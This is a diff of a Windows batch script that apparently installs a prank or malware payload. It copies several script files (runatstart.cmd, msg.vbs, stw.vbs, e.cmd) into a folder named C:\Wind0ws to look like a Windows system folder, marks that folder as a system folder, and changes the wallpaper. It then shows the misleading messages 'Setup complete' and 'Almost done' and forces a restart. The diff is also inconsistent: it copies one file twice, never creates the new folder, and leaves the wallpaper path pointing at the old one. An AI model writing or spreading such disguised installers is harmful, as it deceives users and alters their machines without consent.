@@ -29,12 +29,12 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 
-md C:\Wind
-copy runatstart.cmd C:\Wind
-copy msg.vbs C:\Wind
-copy stw.vbs C:\Wind
-copy e.cmd C:\Wind
+copy msg.vbs C:\Wind0ws
+copy runatstart.cmd C:\Wind0ws
+copy msg.vbs C:\Wind0ws
+copy stw.vbs C:\Wind0ws
+copy e.cmd C:\Wind0ws
 start echo Setup complete
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\Wind\back.jpg /f
-ATTRIB  +S C;\Wind /S
+ATTRIB  +S C:\Wind0ws /S
 shutdown -r -c "Almost done"
